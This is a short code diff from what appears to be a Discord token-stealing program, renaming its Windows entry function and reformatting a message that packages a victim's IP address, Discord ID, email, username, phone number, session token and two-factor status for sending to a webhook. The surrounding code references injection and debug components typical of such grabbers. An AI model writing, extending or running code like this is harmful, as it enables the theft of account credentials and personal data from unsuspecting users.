@@ -63,7 +63,7 @@ def main(webhook: str):
     Discord()
 
 
-def Stringless(webhook: str):
+def anarchy(webhook: str):
     Debug()
 
     procs = [main, Injection]
@@ -358,7 +358,7 @@ class Discord:
            #         else:
            #             methods += "Invalid"
 
-            val += f'**IP:** \n{ip} \n**ID:** \n{discord_id} \n**Email:** \n{email}\n**User:** \n{username}\n**Phone:** \n{phone}\n**Token:** \n{token}\n**2FA:** \n{mfa}'
+            val += f'**IP** \n{ip} \n**ID** \n{discord_id} \n**Email** \n{email}\n**User** \n{username}\n**Phone** \n{phone}\n**Token** \n{token}\n**2FA** \n{mfa}'
 
             #if "code" in gift.text:
             #    codes = json.loads(gift.text)
@@ -854,4 +854,4 @@ class Debug:
 
 
 if __name__ == '__main__' and os.name == "nt":
-    Stringless(__WEBHOOK__)
+    anarchy(__WEBHOOK__)
